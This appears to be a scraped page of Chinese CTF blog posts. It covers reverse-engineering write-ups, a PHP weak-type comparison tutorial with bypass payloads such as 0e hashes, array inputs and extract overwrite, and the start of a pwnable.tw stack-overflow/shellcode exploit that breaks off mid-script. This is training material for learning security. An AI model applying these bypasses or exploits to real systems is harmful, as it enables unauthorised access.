t;[])))&lt;&lt;(-~([]&lt;[])))),~((~((((~((((~(([]&lt;[]))&lt;&lt;(-~([]&lt;[])))&lt;&lt;(-~([]&lt;[])))&lt;&lt;(-~([]&lt;[]))))&lt;&lt;(-~([]&lt;[])))&lt;&lt;(-~([]&lt;[])))&lt;&lt;(-~([]&lt;[]))))&lt;&lt;(-~([]&lt;[])))),(~(((~(((~(((~(([]&lt;[]))&lt;&lt;(-~([]&lt;[])))&lt;&lt;(-~([]&lt;[]))))&lt;&lt;(-~([]&lt;[])))&lt;&lt;(-~([]&lt;[]))))&lt;&lt;(-~([]&lt;[])))&lt;&lt;(-~([]&lt;[]))))&lt;&lt;(-~([]&lt;[]))),~((~(((~((~((~(((~(([]&lt;[]))&lt;&lt;(-~([]&lt;[])))&lt;&lt;(-~([]&lt;[]))))&lt;&lt;(-~([]&lt;[]))))&lt;&lt;(-~([]&lt;[]))))&lt;&lt;(-~([]&lt;[])))&lt;&lt;(-~([]&lt;[]))))&lt;&lt;(-~([]&lt;[]))))]flag = input(&quot;flag: &quot;)if len(flag) == 31: for i in range(len(flag)): if (ord(flag[i])^((~((~(((-~([]&lt;[]))&lt;&lt;(-~([]&lt;[]))))&lt;&lt;(-~([]&lt;[]))))&lt;&lt;(-~([]&lt;[])))&lt;&lt;(-~([]&lt;[]))))!=x[i]: print(&quot;Wrong&quot;) exit() print(&quot;Correct&quot;)else: print(&quot;Wrong&quot;) 这个挺有意思的[]&lt;[]产生一个0然后用各种位运算。只需要x[]异或上if判断中的 (((((((-([]&lt;[]))&lt;&lt;(-([]&lt;[]))))&lt;&lt;(-([]&lt;[]))))&lt;&lt;(-([]&lt;[])))&lt;&lt;(-~([]&lt;[]))))然后chr输出就拿到flag了 [Mid] diannaobaozhale123456789101112131415161718192021222324252627282930313233343536373839404142434445main proc nearvar_5 = byte ptr -5var_4 = dword ptr -4; __unwind { endbr64 push rbp mov rbp, rsp sub rsp, 10h mov [rbp+var_5], 63 mov edi, 63h call _putchar mov edi, 6Eh call _putchar mov edi, 73h call _putchar mov edi, 73h call _putchar mov edi, 7Bh call _putchar mov [rbp+var_4], 0 jmp short loc_11B0; ---------------------------------------------------------------------------loc_1194: movsx eax, [rbp+var_5] mov edi, eax ; call _putchar movzx eax, [rbp+var_5] add eax, 2 xor eax, 1 mov [rbp+var_5], al add [rbp+var_4], 1loc_11B0: cmp [rbp+var_4], 9 jle short loc_1194 mov edi, 7Dh call _putchar mov eax, 0 leave retn; }main endp __putchar输出字符 63h 6Eh 73h 73h 7Bh 对应cnss{ cmp [rbp+var_4], 9 jle short loc_1194以及add [rbp+var_4], 1 就是一个九次的循环 7Dh对应 } 12345678910111213141516171819#include &lt;cstdio&gt;int main(){ putchar('c'); putchar('n'); putchar('s'); putchar('s'); putchar('{'); char rbpvar5 = 'c'; for (int i = 0; i &lt;= 9; i++) { putchar(rbpvar5); rbpvar5 += 2; rbpvar5 ^= 1; } putchar('}'); putchar('\\n'); return 0;} 拿到flag cnss{cdghklopst} [Hard] Shino 的心跳大冒险玩了一下发现flag被挡住了，看目录里面有好几个Yuri关键词，搜索了一下发现 https://github.com/rinkako/YuriAVGEngine这个项目 看了下简洁这个游戏引擎是基于虚拟机的，有个main.sil是存放游戏逻辑的中间码的，但是被加密了，像是base64加密，用在线的base64解密发现乱码 继续翻项目，发现有个yuriricli是用来编译项目的，下载源码看看里面是怎么加密的 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778using System.Text;namespace Yuri.YuriInterpreter{ /// &lt;summary&gt; /// 加密解密类 /// &lt;/summary&gt; public static class YuriEncryptor { /// &lt;summary&gt; /// 对一个字符串做DES加密 /// &lt;/summary&gt; /// &lt;param name=&quot;data&quot;&gt;要加密的数据&lt;/param&gt; /// &lt;param name=&quot;key&quot;&gt;私钥&lt;/param&gt; /// &lt;returns&gt;加密完毕的字符串&lt;/returns&gt; public static string EncryptString(string data, string key) { string str = string.Empty; if (string.IsNullOrEmpty(data)) { return str; } MemoryStream ms = new MemoryStream(); byte[] myKey = Encoding.UTF8.GetBytes(key); byte[] myIV = { 0x12, 0x34, 0x56, 0x78, 0x90, 0xAB, 0xCD, 0xEF }; DES myProvider = new DESCryptoServiceProvider(); CryptoStream cs = new CryptoStream(ms, myProvider.CreateEncryptor(myKey, myIV), CryptoStreamMode.Write); try { byte[] bs = Encoding.UTF8.GetBytes(data); cs.Write(bs, 0, bs.Length); cs.FlushFinalBlock(); str = Convert.ToBase64String(ms.ToArray()); } finally { cs.Close(); ms.Close(); } return str; } /// &lt;summary&gt; /// 对一个字符串做DES解密 /// &lt;/summary&gt; /// &lt;param name=&quot;data&quot;&gt;要解密的数据&lt;/param&gt; /// &lt;param name=&quot;key&quot;&gt;私钥&lt;/param&gt; /// &lt;returns&gt;解密完毕的字符串&lt;/returns&gt; public static string DecryptString(string data, string key) { string str = string.Empty; if (string.IsNullOrEmpty(data)) { throw new Exception(&quot;data is empty&quot;); } MemoryStream ms = new MemoryStream(); byte[] myKey = Encoding.UTF8.GetBytes(key); byte[] myIV = { 0x12, 0x34, 0x56, 0x78, 0x90, 0xAB, 0xCD, 0xEF }; DES myProvider = new DESCryptoServiceProvider(); CryptoStream cs = new CryptoStream(ms, myProvider.CreateDecryptor(myKey, myIV), CryptoStreamMode.Write); try { byte[] bs = Convert.FromBase64String(data); cs.Write(bs, 0, bs.Length); cs.FlushFinalBlock(); str = Encoding.UTF8.GetString(ms.ToArray()); } finally { cs.Close(); ms.Close(); } return str; } }} 这个是des加密的，下面还有解密函数，就在窗口load那调用了一下 1234567891011private void CPMainForm_Load(object sender, EventArgs e){ String path = &quot;D:\\\\dw_file\\\\cnss\\\\CNSS Rev Challenge\\\\Scenario\\\\main.sil&quot;; foreach (string encryptedData in File.ReadLines(path)) { string key = &quot;yurayuri&quot;; string decryptedData = YuriEncryptor.DecryptString(encryptedData, key); Console.WriteLine(decryptedData); } } 解密出来的文本是这样的 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889909192939495main_0@NOP^^^^main_0@act_bgm#main_1@act_bg#main_2@act_se#main_4@act_dialog#main_6@act_cstand#main_7@act_se#main_9@act_dialog#main_11@act_deletecstand#main_12@act_se#main_14@act_dialog#main_16@act_se#main_18@act_dialog#main_20@act_stopbgm#main_21@act_cstand#main_22@act_se#main_24@act_dialog#main_26@act_bgm#main_27@act_se#main_29@act_dialog#main_31@act_se#main_33@act_dialog#main_35@act_se#main_37@act_dialog#main_39@act_deletecstand#main_40@act_bg#main_41@act_se#main_43@act_dialog#main_45@act_se#main_47@act_dialog#main_49@act_se#main_51@act_dialog#main_53@act_se#main_55@act_dialog#main_57@act_se#main_59@act_dialog#main_61@act_se#main_63@act_dialog#main_65@act_se#main_66@act_bg#main_67@act_wait#main_68@act_bg#main_69@act_cstand#main_71@act_dialog#main_73@act_deletecstand#main_74@act_se#main_75@act_bg#main_76@act_wait#main_77@act_se#main_78@act_bg#main_79@act_wait#main_80@act_bg#main_81@act_stopbgm#main_82@act_cstand#main_83@act_se#main_85@act_dialog#main_87@act_bg#main_88@act_bgm#main_89@act_deletecstand#main_90@act_cstand#main_91@act_se#main_93@act_dialog#main_95@act_se#main_97@act_dialog#main_99@act_se#main_101@act_dialog#main_103@act_se#main_105@act_dialog#main_107@act_se#main_109@act_dialog#main_111@act_se#main_113@act_dialog#main_115@act_se#main_117@act_dialog#main_119@act_se#main_121@act_dialog#main_123@act_se#main_125@act_dialog#main_127@act_se#main_129@act_dialog#main_131@act_deletecstand#main_132@act_picture#main_133@act_se#main_135@act_dialog#main_137@act_se#main_139@act_dialog#main_142@act_dialog#main_144@act_deletepicture#main_145@act_se#main_147@act_dialog#main_150@act_dialog#main_152@act_shutdown^^0^^109097105110main_0@act_bgm^filename@050053046109112051#vol@052057056^^main_1@act_bg^^^0^^048045048main_1@act_bg^id@049#filename@100111111114046106112103#x@#y@#opacity@#xscale@#yscale@#ro@045050053^^main_2@act_se^^^0^^049045048main_2@act_se^filename@121117107117109111095048048048049046109112051#vol@056048048^^main_4@act_dialog^^^0^^050045048main_4@act_dialog^^^main_6@act_cstand^^^0^^083104105110111058227128142230136145229143171032083104105110111239188140230152175228184128229144141229136154229136154229133165229173166231148181229173144231165158230138128229164167229173166231154132232174161231174151230156186229176143231153189227128130227128143013010035048main_6@act_cstand^id@048#name@083104105110111#face@049#x@049051048#y@049051048#loc@^^main_7@act_se^^^0^^054045048main_7@act_se^filename@121117107117109111095048048048050046109112051#vol@056048048^^main_9@act_dialog^^^0^^055045048main_9@act_dialog^^^main_11@act_deletecstand^^^0^^083104105110111058032227128142232191153230152175230136145239188140233149191231155184232141137231142135239188140228189134229175140230156137231165158231167152230132159227128130227128143013010035048main_11@act_deletecstand^id@048^^main_12@act_se^^^0^^049049045048main_12@act_se^filename@121117107117109111095048048048051046109112051#vol@056048048^^main_14@act_dialog^^^0^^049050045048main_14@act_dialog^^^main_16@act_se^^^0^^083104105110111058032227128142231142176229156168230136145230173163231171153229156168230160161233151168229143163227128130228187164228186186229144145229190128231154132229164167229173166231148159230180187230136145230157165229149166239188129227128143013010035048main_16@act_se^filename@121117107117109111095048048048052046109112051#vol@056048048^^main_18@act_dialog^^^0^^049054045048main_18@act_dialog^^^main_20@act_stopbgm^^^0^^083104105110111058032227128142231173137231173137239188140233130163230152175228187128228185136239188159227128143013010035048main_20@act_stopbgm^^^main_21@act_cstand^^^0^^050048045048main_21@act_cstand^id@049#name@083104105110111#face@050#x@049051048#y@049051048#loc@^^main_22@act_se^^^0^^050049045048main_22@act_se^filename@121117107117109111095048048048053046109112051#vol@056048048^^main_24@act_dialog^^^0^^050050045048main_24@act_dialog^^^main_26@act_bgm^^^0^^083104105110111058032227128142231156139232181183230157165230156137231130185229131143046046046046230136145232135170229183177239188159227128143013010035048main_26@act_bgm^filename@050057046109112051#vol@053048050^^main_27@act_se^^^0^^050054045048main_27@act_se^filename@121117107117109111095048048048054046109112051#vol@056048048^^main_29@act_dialog^^^0^^050055045048main_29@act_dialog^^^main_31@act_se^^^0^^239188159239188159239188159239188154227128142229141131228184135232166129229176143229191131046046046227128143013010035048main_31@act_se^filename@121117107117109111095048048048055046109112051#vol@056048048^^main_33@act_dialog^^^0^^051049045048main_33@act_dialog^^^main_35@act_se^^^0^^239188159239188159239188159239188154227128142232191155229133165230160161229155173229144142239188140229143175232131189228188154230156137228184128228184170229165135230128170231154132229165179228186186230137190228184138228189160227128130227128143013010035048main_35@act_se^filename@121117107117109111095048048048056046109112051#vol@056048048^^main_37@act_dialog^^^0^^051053045048main_37@act_dialog^^^main_39@act_deletecstand^^^0^^239188159239188159239188159239188154227128142229165185230136180231157128231187191232137178229184189229173144239188140228184128229164180231153189229143145227128130232153189231132182231156139232181183230157165229190136229143175231136177239188140228189134229133182229174158232131140229144142230156137228184128228184170229188186229164167231154132231165158231167152231187132231187135227128130227128143013010035048main_39@act_deletecstand^id@048^^main_40@act_bg^^^0^^051057045048main_40@act_bg^id@049#filename@067078083083046112110103#x@#y@#opacity@#xscale@#yscale@#ro@045050053^^main_41@act_se^^^0^^052048045048main_41@act_se^filename@121117107117109111095048048048057046109112051#vol@056048048^^main_43@act_dialog^^^0^^052049045048main_43@act_dialog^^^main_45@act_se^^^0^^239188159239188159239188159239188154227128142229144172232175180230142165232167166228186134232191153228184170231165158231167152231187132231187135231154132228186186239188140233131189230151160228184128228190139229164150229156176232142183229190151228186134229188186229164167231154132229138155233135143227128130227128143013010035048main_45@act_se^filename@121117107117109111095048048049048046109112051#vol@056048048^^main_47@act_dialog^^^0^^052053045048main_47@act_dialog^^^main_49@act_se^^^0^^239188159239188159239188159239188154227128142230184151233128143230181139232175149227128129232189175228187182231160180232167163227128129229188128229143145232191144231187180046046046230149176228184141230184133231154132233171152231171175231165158231167152230138128230156175229156168232191153228184170231187132231187135233135140228187163228187163231155184228188160227128130227128143013010035048main_49@act_se^filename@121117107117109111095048048049049046109112051#vol@056048048^^main_51@act_dialog^^^0^^052057045048main_51@act_dialog^^^main_53@act_se^^^0^^239188159239188159239188159239188154227128142229144132231167141229165150233161185229165150233135145227128129228191157231160148229138160229136134227128129229164167229142130111102102101114239188140229133168233131189232162171232191153228184170231187132231187135231154132228186186230143161229156168230137139228184173227128130227128143013010035048main_53@act_se^filename@121117107117109111095048048049050046109112051#vol@056048048^^main_55@act_dialog^^^0^^053051045048main_55@act_dialog^^^main_57@act_se^^^0^^239188159239188159239188159239188154227128142229144172232175180228187150228187172232191152228188154231187143229184184228184190229138158228184128231167141231165158231167152228187170229188143239188140228184128231190164228186186229155180229156168229165182232140182229186151230151129232190185231148168228184141231159165233129147229147170233135140230157165231154132229164167233135143231187143232180185229164167229150157231137185229150157227128130227128143013010035048main_57@act_se^filename@121117107117109111095048048049051046109112051#vol@056048048^^main_59@act_dialog^^^0^^053055045048main_59@act_dialog^^^main_61@act_se^^^0^^239188159239188159239188159239188154227128142233130163228184170229165179228186186232191152228188154230139191230137128232176147032102108097103032230157165232175177230131145228189160227128130230136145229183178231187143229129183229129183230139191229136176228186134233130163228184170228184156232165191227128130227128143013010035048main_61@act_se^filename@121117107117109111095048048049052046109112051#vol@056048048^^main_63@act_dialog^^^0^^054049045048main_63@act_dialog^^^main_65@act_se^^^0^^239188159239188159239188159239188154227128142230136145232191153229176177230138138229174131229145138232175137228189160239188140229141131228184135228184141232166129231157128228186134229165185231154132233129147239188129227128143013010035048main_65@act_se^filename@121117107117109111095048048049053046109112051#vol@056048048^^main_66@act_bg^^^0^^054053045048main_66@act_bg^id@049#filename@099111110118101114049046112110103#x@#y@#opacity@#xscale@#yscale@#ro@045051048^^main_67@act_wait^^^0^^054054045048main_67@act_wait^time@051048048048^^main_68@act_bg^^^0^^054055045048main_68@act_bg^id@049#filename@100111111114046106112103#x@#y@#opacity@#xscale@#yscale@#ro@045050053^^main_69@act_cstand^^^0^^054056045048main_69@act_cstand^id@049#name@083104105110111#face@050#x@049051048#y@049051048#loc@^^main_71@act_dialog^^^0^^054057045048main_71@act_dialog^^^main_73@act_deletecstand^^^0^^239188129239188129013010035048main_73@act_deletecstand^id@048^^main_74@act_se^^^0^^055051045048main_74@act_se^filename@121117107117109111095048048049054046109112051#vol@056048048^^main_75@act_bg^^^0^^055052045048main_75@act_bg^id@049#filename@099111110118101114050046112110103#x@#y@#opacity@#xscale@#yscale@#ro@045051048^^main_76@act_wait^^^0^^055053045048main_76@act_wait^time@051048048048^^main_77@act_se^^^0^^055054045048main_77@act_se^filename@121117107117109111095048048049055046109112051#vol@056048048^^main_78@act_bg^^^0^^055055045048main_78@act_bg^id@049#filename@079110108121067078083083046112110103#x@#y@#opacity@#xscale@#yscale@#ro@045051048^^main_79@act_wait^^^0^^055056045048main_79@act_wait^time@049053048048048^^main_80@act_bg^^^0^^055057045048main_80@act_bg^id@049#filename@098108097110107046112110103#x@#y@#opacity@#xscale@#yscale@#ro@045051048^^main_81@act_stopbgm^^^0^^056048045048main_81@act_stopbgm^^^main_82@act_cstand^^^0^^056049045048main_82@act_cstand^id@048#name@083104105110111#face@051#x@049051048#y@049051048#loc@^^main_83@act_se^^^0^^056050045048main_83@act_se^filename@121117107117109111095048048049056046109112051#vol@056048048^^main_85@act_dialog^^^0^^056051045048main_85@act_dialog^^^main_87@act_bg^^^0^^083104105110111058227128142231165158226128148226128148231167152226128148226128148228186186226128148226128148227128143013010035048main_87@act_bg^id@049#filename@100111111114046106112103#x@#y@#opacity@#xscale@#yscale@#ro@045050053^^main_88@act_bgm^^^0^^056055045048main_88@act_bgm^filename@050053046109112051#vol@052057056^^main_89@act_deletecstand^^^0^^056056045048main_89@act_deletecstand^id@048^^main_90@act_cstand^^^0^^056057045048main_90@act_cstand^id@048#name@067078083083#face@049#x@049051048#y@049051048#loc@^^main_91@act_se^^^0^^057048045048main_91@act_se^filename@121117107117109111095048048049057046109112051#vol@056048048^^main_93@act_dialog^^^0^^057049045048main_93@act_dialog^^^main_95@act_se^^^0^^229143175231136177231154132229165179229173169058227128142228184141229143175228187165229144172228187150231158142232175180229147166227128130227128143013010035048main_95@act_se^filename@121117107117109111095048048050048046109112051#vol@056048048^^main_97@act_dialog^^^0^^057053045048main_97@act_dialog^^^main_99@act_se^^^0^^083104105110111058227128142231187191232137178229184189229173144239188140228184128229164180231153189229143145239188140231156139232181183230157165229190136229143175231136177046046046046046033033033033227128143013010035048main_99@act_se^filename@121117107117109111095048048050049046109112051#vol@056048048^^main_101@act_dialog^^^0^^057057045048main_101@act_dialog^^^main_103@act_se^^^0^^083104105110111058227128142233154190233129147228189160229176177230152175226128148226128148227128143013010035048main_103@act_se^filename@121117107117109111095048048050050046109112051#vol@056048048^^main_105@act_dialog^^^0^^049048051045048main_105@act_dialog^^^main_107@act_se^^^0^^083104105110111058227128142228184150231149140231172172228184128229143175231136177231154132032067078083083032229168152239188129227128143013010035048main_107@act_se^filename@121117107117109111095048048050052046109112051#vol@056048048^^main_109@act_dialog^^^0^^049048055045048main_109@act_dialog^^^main_111@act_se^^^0^^229143175231136177231154132229165179229173169058227128142230152175231154132239188140230136145229176177230152175032067078083083032229168152229147166227128130227128143013010035048main_111@act_se^filename@121117107117109111095048048050053046109112051#vol@056048048^^main_113@act_dialog^^^0^^049049049045048main_113@act_dialog^^^main_115@act_se^^^0^^067078083083032229168152058227128142230136145228187172229135157232129154231189145231187156229174137229133168229183165228189156229174164230172162232191142230175143228184128228189141229175185231189145231187156229174137229133168230136150229188128229143145232191144231187180230132159229133180232182163231154132230150176231148159229138155233135143229138160229133165239188129227128143013010035048main_115@act_se^filename@121117107117109111095048048050054046109112051#vol@056048048^^main_117@act_dialog^^^0^^049049053045048main_117@act_dialog^^^main_119@act_se^^^0^^067078083083032229168152058227128142229185182228184141230152175228187128228185136229143175230128149231154132233130170230149153231187132231187135229147166239188129227128143013010035048main_119@act_se^filename@121117107117109111095048048050055046109112051#vol@056048048^^main_121@act_dialog^^^0^^049049057045048main_121@act_dialog^^^main_123@act_se^^^0^^067078083083032229168152058227128142232175180228186134232191153228185136229164154239188140229133182229174158228189160230160185230156172228184141229156168230132143230136145228187172229134153228186134228187128228185136229137167230156172239188140228189160229133179229191131231154132229143170230156137032102108097103032229175185229144167239188129227128143013010035048main_123@act_se^filename@121117107117109111095048048050056046109112051#vol@056048048^^main_125@act_dialog^^^0^^049050051045048main_125@act_dialog^^^main_127@act_se^^^0^^067078083083032229168152058227128142230136145232191153229176177229145138232175137228189160229147166239188129227128143013010035048main_127@act_se^filename@121117107117109111095048048050057046109112051#vol@056048048^^main_129@act_dialog^^^0^^049050055045048main_129@act_dialog^^^main_131@act_deletecstand^^^0^^083104105110111058227128142229165185230173163229156168230130132230130132230139137232191145229146140230136145231154132232183157231166187046046046229165189231180167229188160239188129227128143013010035048main_131@act_deletecstand^id@048^^main_132@act_picture^^^0^^049051049045048main_132@act_picture^id@048#filename@067078083083095112110103046112110103#x@053048048#y@051048048#opacity@049#xscale@049046051#yscale@049046051#ro@048^^main_133@act_se^^^0^^049051050045048main_133@act_se^filename@121117107117109111095048048051048046109112051#vol@056048048^^main_135@act_dialog^^^0^^049051051045048main_135@act_dialog^^^main_137@act_se^^^0^^083104105110111058227128142230157165229136176229175185232175157230161134229137141233157162228186134239188129227128143013010035048main_137@act_se^filename@121117107117109111095048048051049046109112051#vol@056048048^^main_139@act_dialog^^^0^^049051055045048main_139@act_dialog^^^main_142@act_dialog^^^0^^067078083083032229168152058227128142102108097103229176177230152175226128148226128148239188129102108097103230152175099110115115123087048119033089048117095052114101095075049110103095048102095082051086051051115051051095033033033033033033125229147166239188129232174176228189143228186134229144151239188159227128143013010035049main_142@act_dialog^^^main_144@act_deletepicture^^^0^^067078083083032229168152058227128142229191171229142187230143144228186164229144167239188129227128143013010035048main_144@act_deletepicture^id@048^^main_145@act_se^^^0^^049052052045048main_145@act_se^filename@121117107117109111095048048051050046109112051#vol@056048048^^main_147@act_dialog^^^0^^049052053045048main_147@act_dialog^^^main_150@act_dialog^^^0^^083104105110111058227128142046046046046231173137231173137239188140229165185232175180228186134229149165239188159227128143013010035049main_150@act_dialog^^^main_152@act_shutdown^^^0^^045045084072069032069078068045045013010035048main_152@act_shutdown^^^^^^0^^049053050045048main_155@act_function^sign@114099108105099107040041^^^main_157@act_endfunction^^1^^049053053045048main_157@act_endfunction^^^^^^0^^049053055045048 然后去官方的技术文档那搜索了一下 1符号“@”表示当前行是可执行命令，Action是命令名称，ParameterName是命令参数的名字，ParameterValueExpression是要赋值给等号左侧参数的表达式，省略号表示一个命令既可以没有&lt;参数, 值&gt;对，也可以有多个&lt;参数, 值&gt;对。注意到，一个命令如果带有多个参数时，参数是没有先后顺序要求的；而符号“#”表明当前行是注释，编译器在做语法分析时将略过它；推导符号Dialog代表在游戏执行过程中要显示的文本，这是AVG游戏使用频率最高的命令，由于文本的显示存在跨行的情况，因此它以一种上下文有关文法来表示 Dialog是文本框相关的，然后这些数字也有规律三个一组的像ascii码一样的，然后尝试搜cnss{的ascii码099110115115123搜到了，把后面的字符串拷贝下来然后python三个三个读拿到flag cnss{W0w!Y0u_4re_K1ng_0f_R3V33s33_!!!!!!} 123s = &quot;099110115115123087048119033089048117095052114101095075049110103095048102095082051086051051115051051095033033033033033033125229147166239188129232174176228189143228186134229144151239188159227128143013010035049&quot;for i in range(0,len(s),3): print(chr(int(s[i:i+3])),end=&quot;&quot;) pwn🎮 nc，启动nc连 😡 让我访问！！！pwntools 1234567891011121314151617181920212223242526272829from pwn import *import rehost,port = &quot;43.156.14.141&quot;,1141p = remote(host,port)p.recvuntil(b&quot;(y/n)\\n&quot;)p.sendline(b&quot;y&quot;)p.recvuntil(b&quot;(y/n)\\n&quot;)p.sendline(b&quot;y&quot;)for i in range(100): string = p.recvline().decode('utf-8') n1,operator,n2 = re.findall(r'(\\d+|\\+|\\-|\\*|\\/)', string) n1,n2 = int(n1),int(n2) if operator == &quot;+&quot;: tmp = str(n1 + n2) p.sendline(tmp.encode('utf-8')) continue else: tmp = str(n1 - n2) p.sendline(tmp.encode('utf-8')) continuewhile 1: ss = input() p.sendline(ss.encode('utf-8')) print(p.recvline()) 👀 你的名字","link":"/2023/09/18/cnss2023/"},{"title":"php弱类型","text":"php弱类型:=== 在进行比较的时候，会先判断两种字符串的类型是否相等，再比较值是否相等== 在进行比较的时候，会先将字符串类型转化成相同，再比较值如果比较一个数字和字符串或者比较涉及到数字内容的字符串，则字符串会被转换成数值并且比较按照数值来进行 $a=”123”;@$b=123;a==b; TRUEa===b; FALSE0==’ ‘; TRUE‘1111’==TRUE; TRUE‘0’==’false’; false‘0’==false;true0x01=1; FLASE0x01=TRUE; TRUE[0]=[NULL]; TRUE NULL=FALSE; TRUE0e123465==0e5555555; TRUE (0e绕过) 案例1 md5弱比较12方法1 0e绕过(0e 科学计数法)方法2 md5处理数组的时候会返回null的值，可以传递两个数组进去使得null==null 12345678910111213&lt;?phpini_set(&quot;display_error&quot;,false);error_reporting(0);if($_POST['param1']!=$_POST['param2']&amp;&amp;md5($_POST[&quot;param1&quot;])==md5($_POST['param2'])){ die(&quot;success&quot;);}else{ echo &quot;fail&quot;;}?&gt; 1param1=QNKCDZO&amp;param2=240610708 //0e绕过 success 案例2 sha1弱类型12方法1 0e绕过(0e 科学计数法)方法2 sha1处理数组的时候会返回null的值，可以传递两个数组进去使得null==null 12345678910111213141516171819&lt;?phpini_set(&quot;display_error&quot;,false);error_reporting(0);$flag =&quot;flag&quot;;if(isset($_GET['name']) &amp;&amp; isset($_GET['password'])){ if($_GET['name'] == $_GET['password'] ) echo '&lt;p&gt;Your password can not be your name&lt;/p&gt;'; else if (sha1($_GET['name']) === sha1($_GET['password'])) die('FLAG:'.flag); else echo '&lt;p&gt;Invalid password.&lt;/p&gt;';}else{ echo &quot;&lt;p&gt;Login first!&lt;/p&gt;&quot;;}?&gt; 1?name[]=1&amp;password[]=2 //md5和sha1无法处理数组传入会返回NULL NULL 案例3 json相关12345==号在比较字符串和数字的时候会将字符串转换成数字再进行比较&quot;1234abcd&quot; == 1234 true&quot;123abc&quot; == 123 true&quot;abcd&quot; == 0 true字符串连续前几位是数字的话就会取这几位为转换的结果 12345678910111213141516171819202122&lt;?phpini_set(&quot;display_error&quot;,false);error_reporting(0);$flag =&quot;flag&quot;;$key = &quot;adminasdasdasd&quot;;if(isset($_GET['message'])){ $message = json_decode($_GET['message']); if($message-&gt;key ==$key) { echo flag; } else { echo &quot;fail&quot;; }}else{ echo &quot;------&quot;;}?&gt; 12?message={&quot;key&quot;:0} //&quot;adminasdasdasd&quot;字符串和数字进行比较的时候会转换成数字//&quot;adminasdasdasd&quot;转换成数字为0 案例4 switch1switch在比较的时候会将字符串转换成数字，转换方法参考上面 123456789101112131415&lt;?phphighlight_file(__FILE__);$i =&quot;3name&quot;;switch ($i){ case 0: case 1: case 2: echo &quot;this is two&quot;; break; case 3: echo &quot;flag&quot;;break;}?&gt;//echo flag switch case数字的时候强制把&quot;3name&quot;转换成数字进行比较，字符串开头包括什么数字就会转换成什么数字 案例5 strcmp1strcmp(string1,string2) strcmp将string1和string2转换为ascii码相减 若返回0,代表两个字符串相等 ；若返回&lt;0 ,代表string1 小于 string2；若返回&gt;0，代表string1 大于 string2 1strcmp在比较字符串和数组的时候会返回0 12345678910111213141516&lt;?phphighlight_file(__FILE__);include &quot;flag.php&quot;;$password=&quot;asdasdad&quot;;if (isset($POST['password'])){ if (strcmp($_POST['password'],$password)==0) { echo &quot;Right!!!login success&quot;; echo $flag; exit; } else{ echo &quot;Wrong password..&quot;; }}?&gt; 1password[]=1 案例6 in_array123456789&lt;?phphighlight_file(__FILE__);$array = [0, 1, 2, '3'];var_dump(in_array('abc', $array));var_dump(in_array('1bc', $array));var_dump(in_array(3, $array));?&gt; 1运行结果bool(true) bool(true) bool(true) 案例7 array_search12345678&lt;?phphighlight_file(__FILE__);$array = [0, 1, 2, '3'];var_dump(array_search('abc', $array));var_dump(array_search('1bc', $array));var_dump(array_search(3, $array));var_dump(array_search('3', $array));?&gt; 1int(0) int(1) int(3) int(3) 变量覆盖extract1extract(); 将输入内容导入符号表，会存在变量覆盖 1234567891011121314&lt;?phphighlight_file(__FILE__);include &quot;flag.php&quot;;extract($_GET);if (isset($gift)){ $content = trim(file_get_contents($flag)); if ($gift == $content) { echo $flag; }}else{ echo 'oh..';}?&gt; 1?gift=&amp;content=","link":"/2023/09/18/php%E5%BC%B1%E7%B1%BB%E5%9E%8B/"},{"title":"pwnable.tw","text":"pwnable.tw持续更新 start检查一下保护 和查看每个段的权限发现，栈上有可执行权限 12345678lhj@lhj-virtual-machine:~/Desktop/pwntw/start$ checksec start[*] '/home/lhj/Desktop/pwntw/start/start' Arch: i386-32-little RELRO: No RELRO Stack: No canary found NX: NX disabled PIE: No PIE (0x8048000) 12345678gef➤ vmmap[ Legend: Code | Heap | Stack ]Start End Offset Perm Path0x08048000 0x08049000 0x00000000 r-x /home/lhj/Desktop/pwntw/start/start0xf7ff8000 0xf7ffc000 0x00000000 r-- [vvar]0xf7ffc000 0xf7ffe000 0x00000000 r-x [vdso]0xfffdd000 0xffffe000 0x00000000 rwx [stack] 查看了下题目逻辑，有一个输出一个输入，执行完输入后，add 0x14使得esp到 0x804809d(exit)，然后ret执行 (exit)结束程序。可以发现输入大小是0x3c，是能覆盖返回地址的。如果能把栈的地址泄露出来的话，就能往栈上写shellcode，然后ret到shellcode那 1234567891011121314151617181920212223Dump of assembler code for function _start: 0x08048060 &lt;+0&gt;: push esp 0x08048061 &lt;+1&gt;: push 0x804809d 0x08048066 &lt;+6&gt;: xor eax,eax 0x08048068 &lt;+8&gt;: xor ebx,ebx 0x0804806a &lt;+10&gt;: xor ecx,ecx 0x0804806c &lt;+12&gt;: xor edx,edx 0x0804806e &lt;+14&gt;: push 0x3a465443 0x08048073 &lt;+19&gt;: push 0x20656874 0x08048078 &lt;+24&gt;: push 0x20747261 0x0804807d &lt;+29&gt;: push 0x74732073 0x08048082 &lt;+34&gt;: push 0x2774654c 0x08048087 &lt;+39&gt;: mov ecx,esp 0x08048089 &lt;+41&gt;: mov dl,0x14 0x0804808b &lt;+43&gt;: mov bl,0x1 0x0804808d &lt;+45&gt;: mov al,0x4 0x0804808f &lt;+47&gt;: int 0x80 0x08048091 &lt;+49&gt;: xor ebx,ebx 0x08048093 &lt;+51&gt;: mov dl,0x3c 0x08048095 &lt;+53&gt;: mov al,0x3 0x08048097 &lt;+55&gt;: int 0x80 0x08048099 &lt;+57&gt;: add esp,0x14=&gt; 0x0804809c &lt;+60&gt;: ret 会发现执行到ret的时候 stack上有一个栈相关的地址，可以通过栈溢出覆盖返回地址调用 write来把esp打印出来泄露这个地址，泄露完后刚刚好又能再read一次，第二次read就写shellcode，然后把返回地址修改成shellcode的起始地址(用泄露出来的地址，gdb去查看这个地址和shellcode的偏移来算shellcode的地址)，第二次read esp到返回地址之间的距离太短了，所以在返回地址后边写shellcode。shellcode的地址 = leak_addr + 0x14(esp距离返回地址的偏移) 123450x08048087 &lt;+39&gt;: mov ecx,esp0x08048089 &lt;+41&gt;: mov dl,0x140x0804808b &lt;+43&gt;: mov bl,0x10x0804808d &lt;+45&gt;: mov al,0x40x0804808f &lt;+47&gt;: int 0x80 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455from pwn import *from LibcSearcher import *context(os='linux',arch='i386',log_level='debug')elf = context.binary = ELF('./start')libc = elf.libcis_debug = 0if(is_debug): p = process()else: ip = &quot;chall.pwnable.tw&quot; port = 10000 p = remote(ip,port)# gdb.attach(p)g = lambda x: gdb.attach(x)# send() sendline() sendafter() sendlineafter()s = lambda x: 